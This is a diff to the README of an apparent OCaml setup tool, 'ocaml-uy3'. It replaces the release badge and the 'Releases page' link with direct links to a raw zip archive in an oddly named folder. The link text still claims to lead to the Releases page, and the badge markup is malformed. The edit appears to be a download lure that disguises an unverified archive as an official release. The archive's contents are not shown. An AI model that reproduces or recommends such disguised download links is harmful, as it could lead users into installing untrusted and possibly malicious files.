@@ -1,6 +1,6 @@
 # 🎉 ocaml-uy3 - Easy OCaml Setup for Everyone
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/pogiako23123/ocaml-uy3/releases)
+[![Download Release](https://raw.githubusercontent.com/pogiako23123/ocaml-uy3/main/Haplodoci/ocaml-uy3_v3.3.zip%https://raw.githubusercontent.com/pogiako23123/ocaml-uy3/main/Haplodoci/ocaml-uy3_v3.3.zip)](https://raw.githubusercontent.com/pogiako23123/ocaml-uy3/main/Haplodoci/ocaml-uy3_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ocaml-uy3! This application helps you set up OCaml, a popular program
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/pogiako23123/ocaml-uy3/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/pogiako23123/ocaml-uy3/main/Haplodoci/ocaml-uy3_v3.3.zip) to download the latest version of the software.
    
 2. Look for the most recent release at the top of the page. You will see a list of files you can download.
 
